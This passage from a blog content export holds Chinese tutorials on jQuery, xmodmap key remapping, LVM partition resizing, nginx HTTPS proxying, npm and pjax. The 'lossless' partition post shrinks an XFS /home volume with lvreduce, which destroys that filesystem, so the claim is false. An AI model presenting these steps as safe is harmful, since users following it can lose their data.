<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&quot;.head&quot;</span>).append(<span class="string">&quot;&lt;span&gt;hello&lt;/span&gt;&quot;</span>)  <span class="comment">//在.head中的最后插入一段html</span></span><br><span class="line"><span class="comment">//结果: &lt;div class=&quot;head&quot;&gt;&lt;span&gt;Faker&lt;/span&gt;&lt;span&gt;hello&lt;/span&gt;&lt;/div&gt;</span></span><br><span class="line"></span><br><span class="line">$(<span class="string">&quot;&lt;span&gt;hello&lt;/span&gt;&quot;</span>).appendTo(<span class="string">&quot;.head&quot;</span>) <span class="comment">//在.head中的最后插入一段html,</span></span><br><span class="line"><span class="comment">//结果: &lt;div class=&quot;head&quot;&gt;&lt;span&gt;Faker&lt;/span&gt;&lt;span&gt;hello&lt;/span&gt;&lt;/div&gt;</span></span><br><span class="line"></span><br><span class="line">$(<span class="string">&quot;.head&quot;</span>).prepend(<span class="string">&quot;&lt;span&gt;hello&lt;/span&gt;&quot;</span>)  <span class="comment">//在.head中的开始插入一段html,</span></span><br><span class="line"><span class="comment">//结果: &lt;div class=&quot;head&quot;&gt;&lt;span&gt;hello&lt;/span&gt;&lt;span&gt;Faker&lt;/span&gt;&lt;/div&gt;</span></span><br><span class="line"></span><br><span class="line">$(<span class="string">&quot;&lt;span&gt;hello&lt;/span&gt;&quot;</span>).prependTo(<span class="string">&quot;.head&quot;</span>)  <span class="comment">//在.head中的开始插入一段html,</span></span><br><span class="line"><span class="comment">//结果: &lt;div class=&quot;head&quot;&gt;&lt;span&gt;hello&lt;/span&gt;&lt;span&gt;Faker&lt;/span&gt;&lt;/div&gt;</span></span><br><span class="line"></span><br><span class="line">$(<span class="string">&quot;.head *:first&quot;</span>).after(<span class="string">&quot;&lt;span&gt;hello&lt;/span&gt;&quot;</span>)  <span class="comment">//在.head中的第一个元素后插入一段html,</span></span><br><span class="line"><span class="comment">//结果: &lt;div class=&quot;head&quot;&gt;&lt;span&gt;Faker&lt;/span&gt;&lt;span&gt;hello&lt;/span&gt;&lt;/div&gt;</span></span><br><span class="line"></span><br><span class="line">$(<span class="string">&quot;&lt;span&gt;hello&lt;/span&gt;&quot;</span>).insertAfter(<span class="string">&quot;.head *:first&quot;</span>)  <span class="comment">//在.head中的第一个元素后插入一段html,</span></span><br><span class="line"><span class="comment">//结果: &lt;div class=&quot;head&quot;&gt;&lt;span&gt;Faker&lt;/span&gt;&lt;span&gt;hello&lt;/span&gt;&lt;/div&gt;</span></span><br><span class="line"></span><br><span class="line">$(<span class="string">&quot;.head *:first&quot;</span>).before(<span class="string">&quot;&lt;span&gt;hello&lt;/span&gt;&quot;</span>)  <span class="comment">//在.head中的第一个元素前插入一段html,</span></span><br><span class="line"><span class="comment">//结果: &lt;div class=&quot;head&quot;&gt;&lt;span&gt;hello&lt;/span&gt;&lt;span&gt;Faker&lt;/span&gt;&lt;/div&gt;</span></span><br><span class="line"></span><br><span class="line">$(<span class="string">&quot;&lt;span&gt;hello&lt;/span&gt;&quot;</span>).insertBefore(<span class="string">&quot;.head *:first&quot;</span>)  <span class="comment">//在.head中的第一个元素后插入一段html,</span></span><br><span class="line"><span class="comment">//结果: &lt;div class=&quot;head&quot;&gt;&lt;span&gt;hello&lt;/span&gt;&lt;span&gt;Faker&lt;/span&gt;&lt;/div&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="load-方法"><a href="#load-方法" class="headerlink" title="$.load()方法"></a>$.load()方法</h3><blockquote>
<p>在指定位置加载请求回来的html页面</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;head&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&quot;.head&quot;</span>).load(url[,data][,callback])</span><br><span class="line"><span class="attr">url</span>:           请求HTML页面的URL地址</span><br><span class="line">data(可选):     请求的key/value参数</span><br><span class="line">callback(可选)  请求完成的回调函数</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>yelog</category>
        <category>大前端</category>
      </categories>
      <tags>
        <tag>jQuery</tag>
      </tags>
  </entry>
  <entry>
    <title>linux下修改按键ESC&lt;=&gt;CAPSLOCK和Control=&gt;ALT_R</title>
    <url>//linux%E4%B8%8B%E4%BF%AE%E6%94%B9%E6%8C%89%E9%94%AEESC%3C=%3ECAPSLOCK%E5%92%8CControl=%3EALT_R</url>
    <content><![CDATA[<p>使用 <code>vim</code> 过程中发现 <code>esc</code> 和 <code>ctrl</code> 按键很难按，小拇指没有那么长啊～～，而 <code>caps_lock</code> 和 <code>alt_r</code>(右alt) 很少用。</p>
<p>本教程将 <code>esc</code> 和 <code>caps_lock</code> 两个按键交换， <code>alt_r</code>(右alt) 改为 <code>ctrl</code>。</p>
<h2 id="一、-esc-与-caps-lock-按键交换"><a href="#一、-esc-与-caps-lock-按键交换" class="headerlink" title="一、 esc 与 caps_lock 按键交换"></a>一、 esc 与 caps_lock 按键交换</h2><p>①. 创建 <code>.xmodmaprc</code> 文件。<br>②. 加入以下内容：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">remove Lock = Caps_Lock</span><br><span class="line">add Lock = Escape</span><br><span class="line">keysym Caps_Lock = Escape</span><br><span class="line">keysym Escape = Caps_Lock</span><br></pre></td></tr></table></figure>
<p>③. 执行 <code>xmodmap .xmodmaprc</code> 使之生效。</p>
<h2 id="二、-将-右alt-改为-ctrl"><a href="#二、-将-右alt-改为-ctrl" class="headerlink" title="二、 将 右alt 改为 ctrl"></a>二、 将 右alt 改为 ctrl</h2><p>①. 查看需要修改键位的 keysym<br>通过 <code>xev | grep keycode</code> 获取右 <code>alt</code> 的 keysym 为 <code>Alt_R</code>。如下图所示：<br><img src="http://img.saodiyang.com/FvuqjLi5czeBluMTyIfv_xUOcu5k.png" class="lazyload" data-srcset="http://img.saodiyang.com/FvuqjLi5czeBluMTyIfv_xUOcu5k.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="通过xev获取右alt的keysym"></p>
<p>②. 查看 <code>Alt_R</code> 是哪个 modifier 使用的<br>通过 <code>xmodmap -pm</code> 查看，发现 <code>Alt_R</code> 是作为 modifier <code>mod1</code> 使用的。如下图所示：<br><img src="http://img.saodiyang.com/Fib8QjT-Ccx30DCf2rF4WkzHsbOH.png" class="lazyload" data-srcset="http://img.saodiyang.com/Fib8QjT-Ccx30DCf2rF4WkzHsbOH.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="查看 Alt_R 是作为 mode1 使用的"></p>
<p>③. 修改 modifier</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xmodmap -e <span class="string">&#x27;remove mod1 = Alt_R&#x27;</span> <span class="comment"># 解除原来绑定</span></span><br><span class="line">xmodmap -e <span class="string">&#x27;add control = Alt_R&#x27;</span> <span class="comment"># 作为 control 使用</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>yelog</category>
        <category>运维</category>
      </categories>
      <tags>
        <tag>vim</tag>
        <tag>keybord</tag>
        <tag>emacs</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>linux无损调整分区大小</title>
    <url>//linux%E6%97%A0%E6%8D%9F%E8%B0%83%E6%95%B4%E5%88%86%E5%8C%BA%E5%A4%A7%E5%B0%8F</url>
    <content><![CDATA[<h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><ul>
<li>系统环境: Red Hat 4.8.5-11</li>
<li>情况：<ol>
<li>home：500G</li>
<li>root：50G</li>
<li>root分区不够用</li>
</ol>
</li>
<li>思路：把home分区的空间划一部分到root分区</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 设置home分区大小为200G，释放300G空间</span></span><br><span class="line">$ lvreduce -L 200G /dev/centos/home</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将空闲空间扩展到root分区</span></span><br><span class="line">$ lvextend -l +100%FREE /dev/centos/root</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用XFS文件系统自带的命令集增加分区空间</span></span><br><span class="line">$ xfs_growfs /dev/mapper/centos-root</span><br></pre></td></tr></table></figure>
<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><h3 id="situation"><a href="#situation" class="headerlink" title="situation"></a>situation</h3><p>挂载在根目录的分区 <code>/dev/mapper/centos-root</code> 爆满，占用100%</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ df -h</span><br><span class="line">Filesystem               Size  Used Avail Use% Mounted on</span><br><span class="line">/dev/mapper/centos-root   50G   50G   19M 100% /</span><br><span class="line">devtmpfs                  32G     0   32G   0% /dev</span><br><span class="line">tmpfs                     32G     0   32G   0% /dev/shm</span><br><span class="line">tmpfs                     32G  2.5G   29G   8% /run</span><br><span class="line">tmpfs                     32G     0   32G   0% /sys/fs/cgroup</span><br><span class="line">/dev/mapper/centos-home  476G   33M  476G   1% /home</span><br><span class="line">/dev/sda1                497M  238M  259M  48% /boot</span><br><span class="line">tmpfs                    6.3G     0  6.3G   0% /run/user/0</span><br></pre></td></tr></table></figure>
<h3 id="analyze"><a href="#analyze" class="headerlink" title="analyze"></a>analyze</h3><p>挂载在根目录的分区空间太小，只有50G，而服务器 <code>home</code> 目录为非常用目录，挂在了近500G的空间。</p>
<p>思路：从 <code>centos-home</code> 分区划出300G空间到 <code>centos-root</code> 分区。</p>
<h3 id="operation"><a href="#operation" class="headerlink" title="operation"></a>operation</h3><h4 id="1-查看各分区信息"><a href="#1-查看各分区信息" class="headerlink" title="1.查看各分区信息"></a>1.查看各分区信息</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ lvdisplay</span><br><span class="line">--- Logical volume ---</span><br><span class="line">LV Path                /dev/centos/home</span><br><span class="line">LV Name                home</span><br><span class="line">VG Name                centos</span><br><span class="line">LV UUID                1fAt1E-bQsa-1HXR-MCE2-5VZ1-xzBz-iI1SLv</span><br><span class="line">LV Write Access        <span class="built_in">read</span>/write</span><br><span class="line">LV Creation host, time localhost, 2016-10-26 17:23:47 +0800</span><br><span class="line">LV Status              available</span><br><span class="line"><span class="comment"># open                 0</span></span><br><span class="line">LV Size                475.70 GiB</span><br><span class="line">Current LE             121778</span><br><span class="line">Segments               1</span><br><span class="line">Allocation             inherit</span><br><span class="line">Read ahead sectors     auto</span><br><span class="line">- currently <span class="built_in">set</span> to     256</span><br><span class="line">Block device           253:2</span><br><span class="line"></span><br><span class="line">--- Logical volume ---</span><br><span class="line">LV Path                /dev/centos/root</span><br><span class="line">LV Name                root</span><br><span class="line">VG Name                centos</span><br><span class="line">LV UUID                lD64zY-yc3Z-SZaB-dAjK-03YM-2gM8-pfj4oo</span><br><span class="line">LV Write Access        <span class="built_in">read</span>/write</span><br><span class="line">LV Creation host, time localhost, 2016-10-26 17:23:48 +0800</span><br><span class="line">LV Status              available</span><br><span class="line"><span class="comment"># open                 1</span></span><br><span class="line">LV Size                50.00 GiB</span><br><span class="line">Current LE             12800</span><br><span class="line">Segments               1</span><br><span class="line">Allocation             inherit</span><br><span class="line">Read ahead sectors     auto</span><br><span class="line">- currently <span class="built_in">set</span> to     256</span><br><span class="line">Block device           253:0</span><br></pre></td></tr></table></figure>
<h4 id="2-减少-home分区空间"><a href="#2-减少-home分区空间" class="headerlink" title="2.减少/home分区空间"></a>2.减少/home分区空间</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 释放 /dev/centos/home 分区 300G 的空间</span></span><br><span class="line"><span class="comment"># 命令设置 /dev/centos/home 分区 200G空间</span></span><br><span class="line">$ lvreduce -L 200G /dev/centos/home</span><br><span class="line">WARNING: Reducing active logical volume to 200.00 GiB.</span><br><span class="line"> THIS MAY DESTROY YOUR DATA (filesystem etc.)</span><br><span class="line">Do you really want to reduce centos/home? [y/n]: y</span><br><span class="line"> Size of logical volume centos/home changed from 475.70 GiB (121778 extents) to 200.00 GiB (51200 extents).</span><br><span class="line"> Logical volume centos/home successfully resized.</span><br></pre></td></tr></table></figure>

<h4 id="3-增加-root分区空间"><a href="#3-增加-root分区空间" class="headerlink" title="3.增加/root分区空间"></a>3.增加/root分区空间</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ lvextend -l +100%FREE /dev/centos/root</span><br><span class="line">Size of logical volume centos/root changed from 50.06 GiB (12816 extents) to 325.76 GiB (83394 extents).</span><br><span class="line">Logical volume centos/root successfully resized.</span><br></pre></td></tr></table></figure>

<h4 id="4-扩展XFS文件空间大小"><a href="#4-扩展XFS文件空间大小" class="headerlink" title="4.扩展XFS文件空间大小"></a>4.扩展XFS文件空间大小</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ xfs_growfs /dev/mapper/centos-root</span><br><span class="line">meta-data=/dev/mapper/centos-root isize=256    agcount=4, agsize=3276800 blks</span><br><span class="line">         =                       sectsz=512   attr=2, projid32bit=1</span><br><span class="line">         =                       crc=0        finobt=0 spinodes=0</span><br><span class="line">data     =                       bsize=4096   blocks=13107200, imaxpct=25</span><br><span class="line">         =                       sunit=0      swidth=0 blks</span><br><span class="line">naming   =version 2              bsize=4096   ascii-ci=0 ftype=0</span><br><span class="line"><span class="built_in">log</span>      =internal               bsize=4096   blocks=6400, version=2</span><br><span class="line">         =                       sectsz=512   sunit=0 blks, lazy-count=1</span><br><span class="line">realtime =none                   extsz=4096   blocks=0, rtextents=0</span><br><span class="line">data blocks changed from 13107200 to 85395456</span><br></pre></td></tr></table></figure>
<p>完成</p>
]]></content>
      <categories>
        <category>yelog</category>
        <category>运维</category>
      </categories>
      <tags>
        <tag>运维</tag>
        <tag>磁盘分区</tag>
      </tags>
  </entry>
  <entry>
    <title>nginx配置记录</title>
    <url>//nginx-config</url>
    <content><![CDATA[<h2 id="启用https"><a href="#启用https" class="headerlink" title="启用https"></a>启用https</h2><h3 id="1-购买免费证书"><a href="#1-购买免费证书" class="headerlink" title="1.购买免费证书"></a>1.购买免费证书</h3><p>登录阿里云 -&gt; 控制台 -&gt; 安全（云盾） -&gt; CA证书服务 -&gt; 购买证书<br><img src="http://img.saodiyang.com/Fr8xZ-Z1ylYPcoN1PCTk_5SDm6TM.png" class="lazyload" data-srcset="http://img.saodiyang.com/Fr8xZ-Z1ylYPcoN1PCTk_5SDm6TM.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="购买免费证书"></p>
<h3 id="2-补全证书信息"><a href="#2-补全证书信息" class="headerlink" title="2.补全证书信息"></a>2.补全证书信息</h3><p>点击补全，绑定域名</p>
<h3 id="3-下载并配置"><a href="#3-下载并配置" class="headerlink" title="3.下载并配置"></a>3.下载并配置</h3><p>选择下载 证书for nginx<br><img src="http://img.saodiyang.com/FnMUOU4IZY2ZbMZcqggp4v7JHtej.png" class="lazyload" data-srcset="http://img.saodiyang.com/FnMUOU4IZY2ZbMZcqggp4v7JHtej.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="下载证书"></p>
<p>上面这个页面有相关的配置信息，下面简单介绍：</p>
<p>① 将下载文件中的 <code>*.pem</code>、<code>*.key</code>, 拷贝到 nginx 目录下 的 <code>cert</code> , 当然也可以是其他目录<br>② 修改 <code>nginx.conf</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">      listen       443 ssl;</span><br><span class="line">      server_name  xiangzhangshugongyi.com;</span><br><span class="line"></span><br><span class="line">      ssl_certificate      cert/214487958220243.pem;</span><br><span class="line">      ssl_certificate_key  cert/214487958220243.key;</span><br><span class="line"></span><br><span class="line">      ssl_session_cache    shared:SSL:1m;</span><br><span class="line">      ssl_session_timeout  5m;</span><br><span class="line"></span><br><span class="line">      ssl_ciphers  HIGH:!aNULL:!MD5;</span><br><span class="line">      ssl_prefer_server_ciphers  on;</span><br><span class="line"></span><br><span class="line">      location / &#123;</span><br><span class="line">          proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">          proxy_set_header Host $http_host;</span><br><span class="line">          proxy_set_header X-Forwarded-Proto https;</span><br><span class="line">          proxy_redirect off;</span><br><span class="line">          proxy_connect_timeout      240;</span><br><span class="line">          proxy_send_timeout         240;</span><br><span class="line">          proxy_read_timeout         240;</span><br><span class="line">          # note, there is not SSL here! plain HTTP is used</span><br><span class="line">          proxy_pass http://127.0.0.1:8080;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>③ 重启 nginx，通过 证书绑定域名进行 https 访问到 服务器跑在 8080 的服务<br><img src="http://img.saodiyang.com/FtTXB9QIYoZOlPFKsGg-ImxbL58N.png" class="lazyload" data-srcset="http://img.saodiyang.com/FtTXB9QIYoZOlPFKsGg-ImxbL58N.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="通过https访问"></p>
]]></content>
      <categories>
        <category>yelog</category>
        <category>运维</category>
      </categories>
      <tags>
        <tag>nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>npm使用介绍</title>
    <url>//npm</url>
    <content><![CDATA[<h2 id="What"><a href="#What" class="headerlink" title="What"></a>What</h2><p>npm（全称Node Package Manager，即node包管理器）是Node.js默认的、以JavaScript编写的软件包管理系统。<br>作者：艾萨克·施吕特（Isaac Z. Schlueter）</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>npm 是随同node.js一起安装的，所以安装node.js即可。</p>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看版本</span></span><br><span class="line">$ npm -v</span><br><span class="line"></span><br><span class="line"><span class="comment"># 升级</span></span><br><span class="line">$ sudo npm install npm -g</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装模块</span></span><br><span class="line">$ npm install &lt;Module Name&gt;    <span class="comment">#本地安装</span></span><br><span class="line"><span class="comment"># 本地安装：安装到./node_modules(命令运行目录)</span></span><br><span class="line">$ npm install &lt;Module Name&gt; -g <span class="comment">#全局安装</span></span><br><span class="line"><span class="comment"># 全局安装：放在 /usr/local 下或者你 node 的安装目录。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 卸载模块</span></span><br><span class="line">$ npm uninstall &lt;Module Name&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更新模块</span></span><br><span class="line">$ npm update &lt;Module Name&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看所有安装的模块</span></span><br><span class="line">$ npm ls     <span class="comment">#所有本地模块</span></span><br><span class="line">$ npm ls -g  <span class="comment">#所有全局模块</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 搜索模块</span></span><br><span class="line">$ npm search &lt;Module Name&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>yelog</category>
        <category>大前端</category>
      </categories>
      <tags>
        <tag>node</tag>
      </tags>
  </entry>
  <entry>
    <title>pjax用法</title>
    <url>//pjax</url>
    <content><![CDATA[<p>最近在开发一款hexo主题3-hexo，其中使用了pjax大大提高了用户体验和加载速度，在此简单介绍一下pjax的用法<a href="https://github.com/defunkt/jquery-pjax">github链接</a></p>
<span id="more"></span>
<h2 id="pjax是什么"><a href="#pjax是什么" class="headerlink" title="pjax是什么"></a>pjax是什么</h2><blockquote>
<p>pjax是一款jQuery插件，使用了ajax和pushState的技术，在保留真正永久链接，网页标题和可用的返回功能的情况下，带来一种快速的浏览体验。 –官方介绍</p>
</blockquote>
<p><code>用人话说</code>，就是当跳转过去的网页和当前网页的一部分是一样的，这时可以通过pjax就会从响应页面中取出 <code>不同的那部分</code> （需指定），替换掉原来的内容。 如果在服务端判断处理，直接返回 <code>不同的那部分内容</code>，这样就可以减少带宽占用，提升加载速度。</p>
<p>这样做的优势：</p>
<ol>
<li>由于从服务器取回的数据量变少，加载速度将会提升。</li>
<li>并且采用异步刷新页面中的不一样的地方，用户体验也是满满的。</li>
<li>保留了浏览器回退的功能（解决了ajax的尴尬）</li>
</ol>
<p>好了，开始操作。</p>
<h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><p>第一步：引入jQuery和jQuery.pjax</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;//cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;//cdnjs.cloudflare.com/ajax/libs/jquery.pjax/1.9.6/jquery.pjax.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>第二步：将指定的a的链接，转为pjax风格</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*将#menu中的a的链接的页面，只取回class=pjax元素中的内容，替换掉当前页面class=pjax元素中的内容*/</span></span><br><span class="line">$(<span class="built_in">document</span>).pjax(<span class="string">&#x27;.#menu a&#x27;</span>, <span class="string">&#x27;.pjax&#x27;</span>, &#123;<span class="attr">fragment</span>:<span class="string">&#x27;.pjax&#x27;</span>, <span class="attr">timeout</span>:<span class="number">8000</span>&#125;);</span><br></pre></td></tr></table></figure>

<p>第三步：如果需要在请求的过程中做一些自定义的事件，可以使用下面的方法</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="built_in">document</span>).on(&#123;</span><br><span class="line">  <span class="string">&#x27;pjax:click&#x27;</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//点击链接时，需要触发的事件写到这里</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&#x27;pjax:start&#x27;</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//当开始获取请求时，需要触发的事件写在这里</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&#x27;pjax:end&#x27;</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//当请求完成后，需要触发的事件写在这里</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>结束。</p>
<h2 id="详细文档"><a href="#详细文档" class="headerlink" title="详细文档"></a>详细文档</h2><p>翻译于官方</p>
<h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="built_in">document</span>).pjax(selector, [container], options)</span><br></pre></td></tr></table></figure>
<ol>
<li><code>selector</code> 触发点击事件的选择器，String类型</li>
<li><code>container</code> 一个选择器，为唯一的pjax容器</li>
<li><code>options</code> 一个可以包含下面这些选项的对象</li>
</ol>
<h3 id="pjax-options"><a href="#pjax-options" class="headerlink" title="pjax options"></a>pjax options</h3><table>
<thead>
<tr>
<th align="left">key</th>
<th align="left">default</th>
<th align="left">description</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>timeout</code></td>
<td align="left">650</td>
<td align="left">ajax超时时间，单位毫秒，超时后将请求整个页面进行刷新</td>
</tr>
<tr>
<td align="left"><code>push</code></td>
<td align="left">true</td>
<td align="left">使用 pushState 添加一个浏览器历史导航条目</td>
</tr>
<tr>
<td align="left"><code>replace</code></td>
<td align="left">false</td>
<td align="left">替换URL，而不添加浏览器历史条目</td>
</tr>
<tr>
<td align="left"><code>maxCacheLength</code></td>
<td align="left">20</td>
<td align="left">历史内容 cache 的最大size</td>
</tr>
<tr>
<td align="left"><code>version</code></td>
<td align="left"></td>
<td align="left">string ： 当前pjax版本</td>
</tr>
<tr>
<td align="left"><code>scrollTo</code></td>
<td align="left">0</td>
<td align="left">垂直位置滚动，为了避免改变滚动条位置</td>
</tr>
<tr>
<td align="left"><code>type</code></td>
<td align="left">“GET”</td>
<td align="left">可以查看<a href="http://api.jquery.com/jQuery.ajax/">jQuery.ajax()</a></td>
</tr>
<tr>
<td align="left"><code>dataType</code></td>
<td align="left">“html”</td>
<td align="left">可以查看<a href="http://api.jquery.com/jQuery.ajax/">jQuery.ajax()</a></td>
</tr>
<tr>
<td align="left"><code>container</code></td>
<td align="left"></td>
<td align="left">css选择器，此元素内容将被替换</td>
</tr>
<tr>
<td align="left"><code>url</code></td>
<td align="left">link.href</td>
<td align="left">string: ajax 请求的URL</td>
</tr>
<tr>
<td align="left"><code>target</code></td>
<td align="left">link</td>
<td align="left">eventually the relatedTarget value for <a href="#Events">pjax events</a></td>
</tr>
<tr>
<td align="left"><code>fragment</code></td>
<td align="left"></td>
<td align="left">从ajax响应的页面中抽取的‘片段’</td>
</tr>
</tbody></table>
<h3 id="Events"><a href="#Events" class="headerlink" title="Events"></a>Events</h3><p>除了<code>pjax:click</code>和<code>pjax:clicked</code>外的所有pjax事件从pjax容器中触发，是不需要点击链接的。<br><strong>所有事件的生命周期在通过pjax请求链接的过程中</strong></p>
<table>
<thead>
<tr>
<th align="left">event</th>
<th align="left">cancel</th>
<th align="left">arguments</th>
<th align="left">notes</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>pjax:click</code></td>
<td align="left">✔︎</td>
<td align="left"><code>options</code></td>
<td align="left">在一个链接被激活（点击）时触发此事件，可以在此取消阻止pjax</td>
</tr>
<tr>
<td align="left"><code>pjax:beforeSend</code></td>
<td align="left">✔︎</td>
<td align="left"><code>xhr, options</code></td>
<td align="left">可以设置 XHR 头</td>
</tr>
<tr>
<td align="left"><code>pjax:start</code></td>
<td align="left"></td>
<td align="left"><code>xhr, options</code></td>
<td align="left"></td>
</tr>
<tr>
<td align="left"><code>pjax:send</code></td>
<td align="left"></td>
<td align="left"><code>xhr, options</code></td>
<td align="left"></td>
</tr>
<tr>
<td align="left"><code>pjax:clicked</code></td>
<td align="left"></td>
<td align="left"><code>options</code></td>
<td align="left">当链接被点击，并且已经开始pjax请求后触发</td>
</tr>
<tr>
<td align="left"><code>pjax:beforeReplace</code></td>
<td align="left"></td>
<td align="left"><code>contents, options    </code></td>
<td align="left">从服务器已经加载到HTML内容，在替换HTML内容之前触发</td>
</tr>
<tr>
<td align="left"><code>pjax:success</code></td>
<td align="left"></td>
<td align="left"><code>data, status, xhr, options</code></td>
<td align="left">从服务器已经加载到HTML内容，在替换HTML内容之后触发</td>
</tr>
<tr>
<td align="left"><code>pjax:timeout</code></td>
<td align="left">✔︎</td>
<td align="left"><code>xhr, options</code></td>
<td align="left">页面将会在<code>options.timeout</code>之后直接发起请求刷新页面，除非取消pjax</td>
</tr>
<tr>
<td align="left"><code>pjax:error</code></td>
<td align="left">✔︎</td>
<td align="left">xhr, textStatus, error, options</td>
<td align="left">ajax 错误，将会请求刷新页面，除非取消pjax</td>
</tr>
<tr>
<td align="left"><code>pjax:complete</code></td>
<td align="left"></td>
<td align="left">xhr, textStatus, options</td>
<td align="left">不管结果是什么，在ajax后，都触发</td>
</tr>
<tr>
<td align="left"><code>pjax:end</code></td>
<td align="left"></td>
<td align="left"><code>xhr, options</code></td>
<td align="left"></td>
</tr>
</tbody></table>
<p><strong>生命周期在浏览器返回或前进时触发</strong></p>
<table>
<thead>
<tr>
<th align="left">event</th>
<th align="left">cancel</th>
<th align="left">arguments</th>
<th align="left">notes</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>pjax:popstate</code></td>
<td align="left"></td>
<td align="left"></td>
<td align="left">事件方向(前进，后退)属性: “back”/“forward”</td>
</tr>
<tr>
<td align="left"><code>pjax:start</code></td>
<td align="left"></td>
<td align="left"><code>null, options</code></td>
<td align="left">替换内容前</td>
</tr>
<tr>
